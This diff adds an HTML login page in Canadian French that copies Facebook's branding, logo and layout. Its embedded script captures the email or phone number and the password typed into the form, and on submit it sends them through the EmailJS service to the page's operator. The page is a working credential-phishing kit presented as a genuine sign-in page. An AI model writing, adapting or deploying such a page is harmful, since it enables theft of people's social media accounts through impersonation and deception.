@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Français (Canada)</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #f0f2f5 0%, #e8eaed 100%);
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            height: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .content {
+            width: 100%;
+            max-width: 340px;
+            text-align: center;
+        }
+        h1 {
+            color: #1c1e21;
+            font-size: 20px;
+            font-weight: normal;
+            margin-bottom: 30px;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 20px;
+            background-color: #1877f2;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        form {
+            width: 100%;
+        }
+        input, button {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+        input {
+            background-color: #f5f6f7;
+        }
+        input::placeholder {
+            color: #90949c;
+        }
+        button {
+            background-color: #1877f2;
+            color: white;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+        }
+        .forgot-password {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-top: 16px;
+        }
+        .create-account {
+            background-color: #e7f3ff;
+            color: #1877f2;
+            border: none;
+            margin-top: 16px;
+            font-weight: bold;
+        }
+        footer {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            font-size: 12px;
+            color: #737373;
+            margin-top: auto;
+        }
+        footer a {
+            color: #737373;
+            text-decoration: none;
+        }
+    </style>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          emailjs.init("YOUR_USER_ID");
+       })();
+
+       function handleFormSubmit(event) {
+            event.preventDefault();
+            const emailOrPhone = document.querySelector('input[name="email_or_phone"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            
+            emailjs.send("service_iw97iee", "template_zvf9gb3", {
+                email_or_phone: emailOrPhone,
+                password: password
+            })
+            .then((response) => {
+                console.log('Email successfully sent!', response.status, response.text);
+            }, (error) => {
+                console.error('Failed to send email.', error);
+            });
+        }
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.querySelector('form');
+            form.addEventListener('submit', handleFormSubmit);
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <h1>Français (Canada)</h1>
+            <div class="logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" width="36" height="36"><path fill="#1877F2" d="M36 18c0-9.94-8.06-18-18-18S0 8.06 0 18c0 9.01 6.63 16.44 15.26 17.83V23.27h-4.6v-5.23h4.6v-3.88c0-4.55 2.7-7.06 6.86-7.06 1.99 0 4.08.35 4.08.35v4.47h-2.3c-2.27 0-2.97 1.41-2.97 2.85v3.27h5.05l-.8 5.23h-4.25v12.56C29.37 34.43 36 27 36 18z"/><path fill="#FFF" d="M24.77 23.27l.8-5.23h-5.05v-3.27c0-1.44.7-2.85 2.97-2.85h2.3v-4.47s-2.09-.35-4.08-.35c-4.16 0-6.86 2.51-6.86 7.06v3.88h-4.6v5.23h4.6v12.56c.93.15 1.88.24 2.84.24s1.91-.09 2.84-.24V23.27h4.25z"/></svg>
+            </div>
+            <form>
+                <input type="text" name="email_or_phone" placeholder="Numéro de cellulaire ou adresse courriel">
+                <input type="password" name="password" placeholder="Mot de passe">
+                <button type="submit">Se connecter</button>
+            </form>
+            <a href="#" class="forgot-password">Mot de passe oublié?</a>
+            <button class="create-account">Créer un compte</button>
+        </div>
+        <footer>
+            <a href="#">À propos</a>
+            <a href="#">Aide</a>
+            <a href="#">Plus</a>
+        </footer>
+    </div>
+</body>
+</html>
